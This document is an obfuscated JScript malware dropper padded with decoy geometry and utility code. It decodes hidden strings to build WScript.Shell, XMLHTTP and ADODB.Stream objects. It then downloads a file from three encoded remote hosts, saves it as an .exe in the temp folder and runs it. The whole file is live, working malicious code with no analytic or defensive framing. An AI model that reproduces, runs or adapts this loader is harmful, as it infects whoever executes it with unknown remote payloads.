
var framework = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  ambrosia = [];
var parade = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};var unripe = 0;
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function exposure(kazakhstan) {
	ventral = kazakhstan;
	for (var i in parade){ventral = ventral.replace(i, parade[i]);}
    return ventral;
};

var citizenship = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.exposure4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("devil").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = framework[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = framework[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = framework[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = framework[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var experts ="devilJVdevilRFTVdevilAl".exposure4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var breakfast = "devilQWdevilN0aXZdevillWE9iadevilmVjdA=devil=".exposure4();
String.prototype.exposure2 = function () {
    var decorating = {
        differ: this
    };
    decorating.hunger = decorating.differ["c3Vic3RyaW5n".exposure4()](unripe, citizenship);
    return decorating.hunger;
};

var hygiene ="devilRXhwYW5devilkRW52aXdevilJvbm1lbnRTdHJdevilpbmdz".exposure4();
var Native = function(options){
	
};
var kindle = [breakfast, hygiene,experts,  ""+"."+("oasis","betaken","overtime","alter","locally","efficacious","marvel","drove","exe"), "UnVu".exposure4(), exposure("M"+"SX"+"ML"+("websites","cyber","forage","upset","veterans","unnecessarily","warsaw","2.")+"|M"+"LH"+"TT"+("achieving","subscriber","wrench","reseller","producer","orders","declension","expressed","P>")+"WU"+("workhouse","adventitious","volkswagen","sudan","jeopardy","freeze","virginia","cr")+("condemning","cameroon","lancaster","amputation","inducing","erudite","inputs","ideas","ip")+"t:"+("marcus","adolescent","yeoman","profitless","dulcet","nestle","elsewhere","watson","Sh")+"ell")];
settings = "_F2_";
var uphill = this[kindle.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
BtjxUHtj = "UuTyjX";
intermittent = (("compression", "microphone", "counselor", "hydrogen", "decomposition", "rubicon", "lyrical", "prtlHmclmFlL") + "nmnFFVNMeNL").exposure2();
sedate = (("gathering", "appreciated", "paraguay", "pittance", "torah", "laughingly", "replete", "typical", "gratuitous", "sUbwqzTeKtl") + "obPeyhWQ").exposure2();
  
    String.prototype.bastard = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var mobiles = kindle.pop().split(">");

heraldic = "b3Blbg==".exposure4();
var adjournment = new uphill(mobiles[1]);
var global = new uphill(mobiles[0]);
var dudgeon = adjournment[kindle.shift()](kindle.shift());
weasel = (("deadlock", "demands", "ninetytwo", "indigent", "EVwVNGOnBuk") + "CGBLlETLLga").exposure2();

var huntsman = kindle.shift();
var fotos = kindle.shift();
function updated(tongs, medusa) {

    try {
        var partnerships = dudgeon + "/" + medusa ;
		partnerships = partnerships+ huntsman;
            global[heraldic](("boundaries","presidential","G" + weasel) + ("celibate","cooperation","tardily","deluge","T"), tongs, false);
       
    cTYEPRoEg = "_F7_";
    global[sedate + ("aeschylus","scout","end")]();
	var shotgun=(WScript+"intermittent"=="V2luZG93cyBTY3JpcHQgSG9zdA==".exposure4()+"intermittent")&&global["c3RhdHVz".exposure4()] +""=="MjAw".exposure4()&&typeof(cMyfIIKFCqi)==="undefined";
	lQHNgR = "_F8_";
    if (shotgun) {
		
        var username = new uphill((("alchemy","matted","wishful","sparc","palliate","windows","oblique","conventions","A")+("interpretation","cohesion","rhode","transmitting","philanthropist","pickled","landscapes","pontoon","SEOO")+"DB"+("reprehensible","sleigh","declaration","respondents","fragile","share","hello",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        username[heraldic]();
        OGydSTnl = "_F9_";
        username.type = citizenship;
        CUTSSH = "_F10_";
        username["d3JpdGU=".exposure4()](global[("finder","fader","impair","dictator","promoting","innovations","maximize","")+"R"+"es"+"pon"+parade['U'].toLowerCase()+"e"+"Qm9keQ==".exposure4()]);
        xJfFKFE = "_F11_";
        username[(intermittent + "o"+("corresponding","equally","sociable","grouping","newborn","rumble","bookmark","berry","00")+("explosion","industry","contracting","iraqi","clouds","insuperable","essentially","8i")+"tion").replace("0"+("uphill","basement","breakwater","untruth","madeline","metrical","caucasian","08"), sedate)] = 0;
        nfVkafDJtH = "_F12_";
        username[("should","scanners","jaunt","emigrate","rhubarb","montgomery","niche","s")+"aveT"+"oF"+"ile"](partnerships, 2);
        rfLXur = "_F13_";
        username.close();
        RzRDlObAhRl = "_F14_";
		adjournment[fotos](partnerships, citizenship, true);
    }
} catch (IjcJOMWck) { };

    XkzlNpeLKJo = "_F15_";
}
try{
updated("aHR0cDovLw==".exposure4()+"\u0072\u0073\u0078\u0078\u0078"+"\u002E\u0063\u006F\u006D\u002F\u0073\u0064\u0066\u0067\u0034\u0067\u0033" + "?MeVIShjzWK=QYVpvVkw","JSAGeaa");}catch(wvgAnSwWMg){}

try{
updated("aHR0cDovLw==".exposure4()+"\u0077\u0069\u006B\u0069\u0073\u0065\u0063\u0072\u0075"+"\u002E\u0034\u0030\u0032\u002E\u0063\u006F\u006D\u0031\u002E\u0072\u0075\u002F\u0036\u0035\u0067\u0034\u0033\u0034\u0066" + "?PRKbnLHlRaH=zmXfSCoESg","dBEXDfyr");}catch(PqGwXQnUv){}
updated("aHR0cDovLw==".exposure4()+"\u006B\u0065\u0069\u0063\u0069\u0075\u006F\u0073\u0069"+"\u002E\u006C\u0074\u002F\u0034\u0033\u0034\u0035\u0034\u0079\u0074\u0033\u0032" + "?iKNFFnoNCt=AaItHzHN","gsHaYi");
   BgbptieXM = "_F16_";
   